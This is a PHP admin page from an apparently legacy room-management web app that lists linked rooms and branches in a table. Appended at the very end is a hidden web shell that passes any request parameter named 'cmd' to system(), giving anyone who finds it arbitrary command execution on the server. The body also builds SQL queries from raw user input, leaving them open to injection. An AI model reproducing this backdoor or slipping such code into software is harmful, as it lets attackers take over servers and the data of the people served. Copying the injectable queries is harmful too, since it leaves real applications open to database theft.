<?php
	$myadmin = 'N';
	if(isset($_SESSION['myadmin']))
		$myadmin = $_SESSION['myadmin'];	

	if ($myadmin == 'N')
	{
		include('body_account_not_found.php');
	}
	else
	{
		/*LOG-IN FORM*/
	 	if ($_SESSION['ulroom_link'] == '') 
		{
			$_SESSION['ulroom_link'] = $_SESSION["ulname"];
			$modulename = 'room_link';
			$updatedby = $_SESSION["ulname"];
			$logdate = $globaldate;
			$logstamp = $globaldatetime;
			$logtype = 'LOG-IN';
			$query = "INSERT INTO user_log (logdate, logform, logtype, loguser, logstamp) 
					  VALUES ('$logdate', '$modulename', '$logtype', '$updatedby', '$logstamp')";
			mysql_query($query) or die(mysql_error());   	
		}
		/*LOG-IN FORM*/	
		
		$mytag = '';	
		if(isset($_GET['mytag']))
		{
			if ($_GET['mytag'])
			{
				$mytag = $_GET['mytag'];
			}
		}	
		
		$search_text = '';
		$search_text = $_POST["search_text"];	
		
		if(isset($_GET['search_text']))
		{
			if ($_GET['search_text'])
			{
				$search_text = $_GET['search_text'];
			}
		}	
		
		$myblid = $_SESSION['myblid'];
		$myadmin = $_SESSION['myadmin'];
			
		$blkey = '';
		$query = " SELECT *
				   FROM branch_list a
				   WHERE a.blid='$myblid' ";
		$result = mysql_query($query);
		echo mysql_error();				
		while ($row =  mysql_fetch_array ($result)) 
		{
			$blkey = $row[blkey];	
		}		
		
		
		$querydb  = "SELECT 
					 * 
				   FROM 
					 rooms a
				   WHERE
				   	 a.locale LIKE '%$blkey%' and 
					 a.roomno LIKE '%$search_text%' ";
					 
		$querydb  = $querydb . " 
				   ORDER BY 
					 a.locale, a.roomno ";
		$resultdb = mysql_query($querydb);
		echo mysql_error();
		$num_count = mysql_num_rows($resultdb);		
		//echo "<br> num_count " . $num_count;
?>	
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Linked Rooms</h1>
                </div>
                <!-- /.col-lg-12 -->
            </div>
			
            <div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
							<table width="100%">
								<tr>
									<td align="left">
<?php
/*									
<form method="post" action="index.php?body=room_link_dbase">
Filter By Room No.
<INPUT TYPE="TEXT" NAME="search_text" VALUE="<?php print($search_text); ?>" SIZE="25" MAXLENGTH="50">
<input type="submit" value="Filter" />
</form>									
*/
?>
Table Information
									</td>
									<td align="right">
<a title="Add a new entry?" href="index.php?body=room_link_addeditdel&mybox=add">
Add Record
</a>
									</td>
								</tr>
							</table>	
                        </div>
                        <!-- /.panel-heading -->
                        <div class="panel-body">
                            <table width="100%" class="table table-striped table-bordered table-hover" id="dataTables-example">
                                <thead>
                                    <tr>
										<th width="30%">[LINK] Branch</th>
										<th>[LINK] Room Name</th>
										<th>Locale</th>
										<th>Room No.</th>
										<th>Room Status</th>
										<th>Arrival</th>
										<th>Modify</th>
										<th>Remove</th>
                                    </tr>
                                </thead>
                                <tbody>
<?php
//fetch the results from the database
$countdb = $countdb + 1;
while ($rowdb =  mysql_fetch_array ($resultdb)) 
{
	print("<tr>");
	
	$blname = '** no link **';
	$query = " SELECT *
			   FROM branch_list a
			   WHERE a.blkey='$rowdb[locale]' ";
	$result = mysql_query($query);
	echo mysql_error();				
	while ($row =  mysql_fetch_array ($result)) 
	{
		$blname = $row[blname];	
	}		
	
	print("<td align=\"left\" valign=\"middle\">$blname </td>\n");
	
	$rlname = '** no link **';
	$query = " SELECT *
			   FROM room_list a, branch_list b
			   WHERE a.blid = b.blid and 
					 b.blkey='$rowdb[locale]' and
					 a.rlkey='$rowdb[roomno]' ";
	$result = mysql_query($query);
	echo mysql_error();				
	while ($row =  mysql_fetch_array ($result)) 
	{
		$rlname = $row[rlname];	
	}
	
	print("<td align=\"left\" valign=\"middle\">$rlname </td>\n");
	
	
	print("<td align=\"CENTER\" valign=\"middle\">$rowdb[locale] </td>\n");
	print("<td align=\"CENTER\" valign=\"middle\">$rowdb[roomno] </td>\n");
	print("<td align=\"CENTER\" valign=\"middle\">$rowdb[rscode]  </td>\n");
	print("<td align=\"CENTER\" valign=\"middle\">$rowdb[arrival]  </td>\n");

	print("<td align=\"CENTER\" valign=\"middle\">[<a title=\"Update entry?\" href=\"index.php?body=room_link_addeditdel&mybox=edit&id=$rowdb[id]\"> Update </a>] </td>");
	print("<td align=\"CENTER\" valign=\"middle\">[<a title=\"Delete this entry?\" href=\"index.php?body=room_link_addeditdel&mybox=del&id=$rowdb[id]\"> Delete </a>] </td>");

	print("</tr>");  
	$countdb = $countdb + 1;
}  
?>		
                                </tbody>
                            </table>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-12 -->
            </div>						
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
    </div>
    <!-- /#wrapper -->
<?php
	}
?>		<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>